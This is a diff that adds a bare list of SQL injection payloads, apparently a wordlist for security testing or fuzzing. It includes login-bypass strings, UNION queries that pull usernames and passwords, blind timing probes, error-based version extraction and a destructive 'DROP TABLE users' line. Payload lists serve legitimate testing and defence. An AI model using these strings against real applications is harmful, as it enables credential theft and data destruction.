@@ -1,0 +1,30 @@
+# SQL Injection Pattern Payloads
+' OR 1=1 --
+' OR '1'='1
+' UNION SELECT NULL, NULL --
+' UNION SELECT username, password FROM users --
+1; DROP TABLE users --
+1' AND 1=1 --
+1' AND 1=2 --
+' OR 1=1#
+' OR 1=1/*
+' OR 'a'='a
+admin' --
+admin' #
+admin'/*
+1' AND SLEEP(5) --
+1' AND BENCHMARK(5000000,MD5(1)) --
+1 ORDER BY 1--
+1 ORDER BY 10--
+' UNION ALL SELECT NULL,NULL,NULL--
+' HAVING 1=1--
+' GROUP BY table.column--
+" OR "1"="1
+" OR 1=1 --
+") OR ("1"="1
+' OR EXISTS(SELECT * FROM users)--
+1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
+' OR 'x'='x
+' AND 1=0 UNION ALL SELECT 'admin', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918'--
+' AND 1=1 AND 'a'='a
+' AND 1=2 AND 'a'='b
